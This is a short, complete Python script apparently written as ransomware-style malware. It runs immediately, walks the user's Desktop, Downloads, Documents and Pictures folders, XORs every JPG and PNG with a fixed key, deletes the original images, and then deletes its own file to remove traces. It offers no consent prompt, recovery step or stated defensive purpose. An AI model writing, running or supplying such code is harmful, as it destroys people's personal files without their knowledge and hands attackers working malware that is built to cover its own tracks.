import os

# Directories to search for image files
directories = ['Desktop', 'Downloads', 'Documents', 'Pictures']

# Key for encryption
key = 48

# Encrypt function
def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            image = bytearray(file.read())
        
        # Encrypting the image
        for i, j in enumerate(image):
            image[i] = j ^ key
        
        # Creating the new encrypted image
        encrypted_path = os.path.splitext(file_path)[0] + '_encrypted' + os.path.splitext(file_path)[1]
        with open(encrypted_path, 'wb') as file:
            file.write(image)
        
        # Deleting the original image
        os.remove(file_path)
        
        print(f"Encrypted file: {file_path}")
    
    except IOError:
        print(f"Failed to encrypt file: {file_path}")

# Iterate through directories and encrypt image files
for directory in directories:
    for root, dirs, files in os.walk(os.path.expanduser('~/' + directory)):
        for file in files:
            if file.lower().endswith(('.jpg', '.png')):
                file_path = os.path.join(root, file)
                encrypt_file(file_path)

# Deleting the program file
os.remove(__file__)
print("Program self-deleted.")
